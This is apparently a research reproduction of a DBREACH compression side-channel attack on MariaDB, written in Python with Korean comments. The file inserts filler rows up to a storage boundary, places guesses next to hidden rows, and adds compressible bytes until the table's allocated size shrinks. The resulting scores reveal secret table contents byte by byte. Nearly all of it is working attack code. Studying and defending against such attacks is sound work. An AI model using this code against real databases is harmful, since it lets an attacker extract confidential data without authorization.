# /app/dbreacher_impl.py
import os
import time
import utils.mariadb_utils as utils
import dbreacher
import random

# ---- env knobs ----
LOG_FULL = os.getenv("DBREACH_LOG_FULL", "1") != "0"
AMPLIFY_MAX = int(os.getenv("DBREACH_AMPLIFY_MAX", "300"))  # 300(기본, 논문) ~ 500 권장
AMPLIFY_MAX = max(100, min(500, AMPLIFY_MAX))
PAUSE_S = float(os.getenv("DBREACH_PAUSE_S", "0"))  # 0.0이면 대기 없음

def _say(msg: str):
    print(msg)

class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(
        self,
        controller: utils.MariaDBController,
        tablename: str,
        startIdx: int,
        maxRowSize: int,
        fillerCharSet,
        compressCharAscii: int,
        numFillerRows: int = 800,   # 충분한 여유
    ):
        if isinstance(fillerCharSet, set):
            fillerCharSet = list(fillerCharSet)
        super().__init__(controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii, numFillerRows=numFillerRows)

        # 증폭 페이즈 수(100B당 1페이즈). 논문 기본=3(최대 300B). 필요 시 4~5로 확장 가능.
        self.numAmpPhases = max(1, min(AMPLIFY_MAX // 100, 5))

        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0
        self.rowsAdded = 0
        # [0]은 첫 줄(guess 들어가는 줄), [1..numAmpPhases]는 보조행
        self.rowsChanged = [False] * (self.numAmpPhases + 1)
        self.fillersInserted = False

        _say(f"[INIT] compressChar='{self.compressChar}', fillers={len(self.fillers)} rows, "
             f"startIdx={self.startIdx}, maxRowSize={self.maxRowSize}, phases={self.numAmpPhases} "
             f"(AMPLIFY_MAX={AMPLIFY_MAX}, PAUSE_S={PAUSE_S})")

    # ---------- helpers ----------
    def _comp(self, n: int) -> str:
        return self.compressChar * n

    def _flush(self):
        """강제 flush + (선택)미세 대기"""
        self.control.flush_and_wait(self.table)
        if PAUSE_S > 0:
            time.sleep(PAUSE_S)

    # ---------- lifecycle ----------
    def reinsertFillers(self) -> bool:
        self.compressibilityScoreReady = False
        if self.fillersInserted:
            _say("[REINSERT] begin")
            # 최근에 부풀린 영역 되돌리기: 압축 200B로 덮어써 경계를 리셋
            upto = self.rowsAdded + self.startIdx - (self.bytesShrunkForCurrentGuess // 100)
            for row in range(self.startIdx, max(self.startIdx, upto)):
                s = self._comp(200)
                _say(f"[REINSERT] UPDATE row={row} -> '{s}'")
                self.control.update_row(self.table, row, s)
            self._flush()

            # 기존 filler 삭제
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
                _say(f"[REINSERT] DELETE row={row}")
                self.control.delete_row(self.table, row)
            self._flush()

            # 상태 리셋 + 랜덤 filler 재생성
            self.bytesShrunkForCurrentGuess = 0
            self.fillers = [
                ''.join(self.rng.choices(self.fillerCharSet, k=self.maxRowSize))
                for _ in range(self.numFillerRows)
            ]
            _say(f"[REINSERT] regenerated fillers={len(self.fillers)}")
        else:
            _say("[REINSERT] first-time setup (no previous fillers)")
        return self.insertFillers()

    def insertFillers(self) -> bool:
        """
        논문 방식: 첫 줄은 순수 랜덤 200B, 그 다음 줄들엔
        '100B *' + '100B 랜덤'으로 채워 경계를 민감하게 만든다.
        """
        self.fillersInserted = True
        oldSize = self.control.get_table_size_alloc(self.table)
        _say(f"[FILLER] old_alloc={oldSize}")

        if not self.fillers:
            _say("[FILLER] ERROR: fillers empty")
            return False

        # (1) 첫 filler: 순수 랜덤 200B
        _say(f"[FILLER] INSERT row={self.startIdx} val='{self.fillers[0]}'")
        self.control.insert_row(self.table, self.startIdx, self.fillers[0])
        self._flush()
        self.rowsAdded = 1
        newSize = self.control.get_table_size_alloc(self.table)
        _say(f"[FILLER] after first insert alloc={newSize}")

        if newSize > oldSize:
            _say("[FILLER] grew too quickly -> abort")
            return False

        # (2) 경계 닿을 때까지 삽입:
        #     각 행은 '*'*100 + filler[i][100:] (100B 프리픽스 + 100B 랜덤)
        i = 1
        compression_bootstrapper = self._comp(100)
        CHUNK = 1000
        MAX_TOTAL = 20000
        while newSize <= oldSize:
            if i >= len(self.fillers):
                if len(self.fillers) + CHUNK > MAX_TOTAL:
                    _say(f"[FILLER] ERROR: still <= old_alloc after {len(self.fillers)} rows; abort for safety")
                    return False
                _say(f"[FILLER] extending fillers by {CHUNK} rows")
                more = [
                    ''.join(self.rng.choices(self.fillerCharSet, k=self.maxRowSize))
                    for _ in range(CHUNK)
                ]
                self.fillers.extend(more)

            rowid = self.startIdx + i
            filler = self.fillers[i]
            combined = compression_bootstrapper + filler[100:]  # 논문 스타일
            _say(f"[FILLER] INSERT row={rowid} val='{combined}'")
            self.control.insert_row(self.table, rowid, combined)
            self._flush()
            newSize = self.control.get_table_size_alloc(self.table)
            _say(f"[FILLER] alloc now={newSize}")
            i += 1
            self.rowsAdded += 1

        self.rowsChanged = [False] * (self.numAmpPhases + 1)
        _say(f"[FILLER] boundary reached, rowsAdded={self.rowsAdded}")
        return True

    # ---------- measurement ----------
    def insertGuessAndCheckIfShrunk(self, guess: str) -> bool:
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0

        # 첫 줄과 보조행들 리셋
        if self.rowsChanged[0]:
            _say(f"[GUESS] reset row={self.startIdx} -> '{self.fillers[0]}'")
            self.control.update_row(self.table, self.startIdx, self.fillers[0])
            self.rowsChanged[0] = False

        compression_bootstrapper = self._comp(100)
        for i in range(1, self.numAmpPhases + 1):
            if self.rowsChanged[i]:
                row_to_reset = self.startIdx + self.rowsAdded - i
                filler = self.fillers[self.rowsAdded - i]
                reset_str = compression_bootstrapper + filler[100:]
                _say(f"[GUESS] reset row={row_to_reset} -> '{reset_str}'")
                self.control.update_row(self.table, row_to_reset, reset_str)
                self.rowsChanged[i] = False

        self._flush()
        old_size = self.control.get_table_size_alloc(self.table)

        # guess 삽입(첫 줄 앞부분만 대체)
        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            _say(
                f"[GUESS] UPDATE row={self.startIdx}\n"
                f"  guess='{guess}'\n"
                f"  before='{self.fillers[0]}'\n"
                f"  after ='{new_first_row}'"
            )
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.rowsChanged[0] = True

        self._flush()
        new_size = self.control.get_table_size_alloc(self.table)
        _say(f"[GUESS] alloc {old_size} -> {new_size}")
        return new_size < old_size

    def getSNoReferenceScore(self, length: int, charSet) -> float:
        seq = charSet if isinstance(charSet, (list, str, tuple)) else list(charSet)
        refGuess = ''.join(self.rng.choices(seq, k=length))
        _say(f"[REF:NO] L={length} refGuess='{refGuess}'")
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of NO-ref guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk()
        return self.getBytesShrunkForCurrentGuess()

    def getSYesReferenceScore(self, length: int) -> float:
        # 두 번째 filler 행의 랜덤 뒷부분(100~)은 실제 테이블에서도 동일 위치에 존재
        refGuess = self.fillers[1][100:][:length]
        _say(f"[REF:YES] L={length} refGuess='{refGuess}' (from fillers[1][100:])")
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of YES-ref guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk()
        return self.getBytesShrunkForCurrentGuess()

    def addCompressibleByteAndCheckIfShrunk(self) -> bool:
        """
        +1B 증폭. 페이즈별로 서로 다른 보조행을 사용해 각 행에서
        최대 200B까지 '*' 구간을 만들며 경계를 민감하게 만듦.
        phase 1: comp = 100 + b
        phase k>=2: comp = b - 100*(k-2)
        row index = rowsAdded - k
        """
        old_size = self.control.get_table_size_alloc(self.table)
        self.bytesShrunkForCurrentGuess += 1
        b = self.bytesShrunkForCurrentGuess

        # 현재 페이즈(k) 계산 (1..numAmpPhases)
        k = (b - 1) // 100 + 1
        if k > self.numAmpPhases:
            _say(f"[AMP] cap reached (b>{self.numAmpPhases * 100})")
            raise RuntimeError("Amplification cap reached")

        # comp 길이 계산
        if k == 1:
            comp_len = 100 + b                # 101..200
        else:
            comp_len = b - 100 * (k - 2)      # 각 페이즈에서 101..200로 유지

        # 대상 보조행(뒤에서 k번째)
        row = self.startIdx + self.rowsAdded - k
        base = self.fillers[self.rowsAdded - k]
        newval = self._comp(comp_len) + base[len(self._comp(comp_len)):]
        _say(f"[AMP] +1B (phase{k}) row={row} comp_len={comp_len} val='{newval}'")
        self.control.update_row(self.table, row, newval)
        self.rowsChanged[k] = True

        self._flush()
        new_size = self.control.get_table_size_alloc(self.table)
        _say(f"[AMP] alloc {old_size} -> {new_size}")

        if new_size < old_size:
            self.compressibilityScoreReady = True
            _say(f"[AMP] SHRUNK! bytesShrunkForCurrentGuess={self.bytesShrunkForCurrentGuess}")
            return True
        return False

    # ---------- scores ----------
    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if self.compressibilityScoreReady:
            return 1.0 / float(self.bytesShrunkForCurrentGuess)
        return None

    def getBytesShrunkForCurrentGuess(self) -> int:
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        return None
